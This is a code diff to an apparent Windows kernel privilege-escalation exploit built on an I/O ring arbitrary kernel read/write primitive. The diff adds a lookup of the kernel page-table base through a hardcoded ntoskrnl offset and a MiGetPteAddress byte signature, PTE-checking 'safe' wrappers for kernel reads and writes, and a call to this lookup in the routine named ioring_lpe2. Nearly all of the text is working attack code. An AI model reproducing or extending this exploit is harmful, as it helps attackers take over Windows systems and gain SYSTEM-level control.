@@ -331,6 +331,112 @@ int krnl_read(UINT64 addr, PVOID buffer, SIZE_T size) {
     return ioring_read(0x65007500, addr, buffer, size);
 }
 
+
+ULONG64 ulPageTableAddress; // for testing, need to grab this!!!!!
+ULONG64 get_pagetable_addr() {
+    return ulPageTableAddress;
+}
+
+ULONG64 get_pagetable_address(UINT64 ntBase) {
+    /*
+    UINT64 getPteAddress_addr = kernel_sigscan(ntBase + APPROX_NTOSKRNL_TEXT_OFFSET, APPROX_NTOSKRNL_TEXT_SIZE, getPteAddressSignature, sizeof(getPteAddressSignature)); // might have to scan by page
+
+    ULONG64 pageTableAddress = 0;
+    krnl_read(getPteAddress_addr + 0x13, &pageTableAddress, sizeof(ULONG64));
+
+    return pageTableAddress;*/
+    CHAR getPteAddressSignature[] = { 0x48, 0xc1, 0xe9, 0xff, 0x48, 0xb8, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x48, 0x23, 0xc8, 0x48, 0xb8, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x48, 0x03, 0xc1 };
+    CHAR ptr_msg[1024] = { 0 };
+
+    UINT64 getPteAddress_offset = 0x1efb60;
+    //CHAR getPteAddressBytes[30] = { 0 };
+    ULONG64 pageTableAddress;
+    krnl_read(ntBase + APPROX_NTOSKRNL_TEXT_OFFSET + getPteAddress_offset + 0x13, &pageTableAddress, sizeof(ULONG64));
+
+    //char out[256] = { 0 };
+    //hex_dump(getPteAddressBytes, sizeof(getPteAddressBytes), out);
+
+
+
+    /*sprintf_s(ptr_msg,
+        sizeof(ptr_msg),
+        "[?] MiGetPteAddress bytes:\n%s", out);
+    sock_log(sock, ptr_msg);*/
+
+
+
+    /*sprintf_s(ptr_msg,
+        sizeof(ptr_msg),
+        "[?] PageTable Address: 0x%llx\n",
+        pageTableAddress);
+    sock_log(sock, ptr_msg);*/
+
+    //memcpy(&pageTableAddress, getPteAddressBytes + 0x13, sizeof(ULONG64));
+
+    return pageTableAddress; // TODO: fix sig scanner because thats more elegant
+
+    /*UINT64 getPteAddress_addr;
+    UINT64 page = 0x0;
+    sock_log(sock, "[?] Attempting to find MiGetPteAddress.\n");
+    do {
+        sprintf_s(ptr_msg,
+            sizeof(ptr_msg),
+            "\r[?] Scanning page: 0x%llx",
+            ntBase + APPROX_NTOSKRNL_TEXT_OFFSET + page);
+        sock_log(sock, ptr_msg);
+        getPteAddress_addr = kernel_sigscan(ntBase + APPROX_NTOSKRNL_TEXT_OFFSET + page, 0x1000, getPteAddressSignature, sizeof(getPteAddressSignature)); // hopefully .text and no crash?
+        page += 0x1000;
+    } while (getPteAddress_addr == NULL && page < APPROX_NTOSKRNL_TEXT_SIZE);
+    sprintf_s(ptr_msg,
+        sizeof(ptr_msg),
+        "\n[?] MiGetPteAddress: 0x%llx\n",
+        getPteAddress_addr);
+    sock_log(sock, ptr_msg);*/
+}
+
+void set_pagetable_addr(ULONG64 pageTableAddress) {
+    ulPageTableAddress = pageTableAddress;
+}
+
+UINT64 get_pte_address(UINT64 virtualAddress) {
+    if (!ulPageTableAddress)
+        return 0;
+
+    virtualAddress >>= 9;
+    virtualAddress &= 0x7FFFFFFFF8;
+
+    UINT64 pageTableAddress = ulPageTableAddress;
+    return pageTableAddress += virtualAddress;
+}
+
+MMPTE get_pagetable_entry(UINT64 virtualAddress, PUINT64 pteAddressOut) {
+    UINT64 pteAddr;
+    MMPTE pte;
+    UINT64 pteAddress = get_pte_address(virtualAddress);
+    *pteAddressOut = pteAddress;
+    if (pteAddress) {
+        krnl_read(pteAddress, &pte, sizeof(UINT64));
+        //krnl_read(pteAddr, &pte, sizeof(MMPTE));
+    }
+    return pte;
+}
+
+
+int krnl_read_s(UINT64 addr, PVOID buffer, SIZE_T size) {
+    UINT64 out;
+    if (get_pagetable_entry(addr, &out).u.Hard.Valid)
+        return krnl_read(addr, buffer, size);
+    return 0x5adface; // :(
+}
+
+int krnl_write_s(UINT64 addr, PVOID data, SIZE_T size) {
+    UINT64 out;
+    MMPTE pte = get_pagetable_entry(addr, &out);
+    if (pte.u.Hard.Valid && pte.u.Hard.Write)
+        return krnl_write(addr, data, size);
+    return 0x5adface;
+}
+
 UINT64 ulNtBase;
 void ioring_cleanup() {
     if (!ulNtBase)
@@ -364,6 +470,7 @@ int ioring_lpe2(ULONG pid, ULONG64 ullFakeRegBufferAddr, ULONG ulFakeRegBufferCn
     ullSysToken = 0;
     
     ulNtBase = nt_base;
+    
 
     hProc = OpenProcess(PROCESS_QUERY_INFORMATION, 0, pid);
 
@@ -427,8 +534,8 @@ int ioring_lpe2(ULONG pid, ULONG64 ullFakeRegBufferAddr, ULONG ulFakeRegBufferCn
     //UINT64 orig_val = ulNtBase + get_orig_sd_offset();
     //ret = ioring_write(pFakeRegBuffers, ulNtBase + get_sd_ptr_offset(), &orig_val, sizeof(orig_val));
     
-
+    ulPageTableAddress = get_pagetable_address(nt_base);
     //ioring_cleanup();
     
-
+    
 }
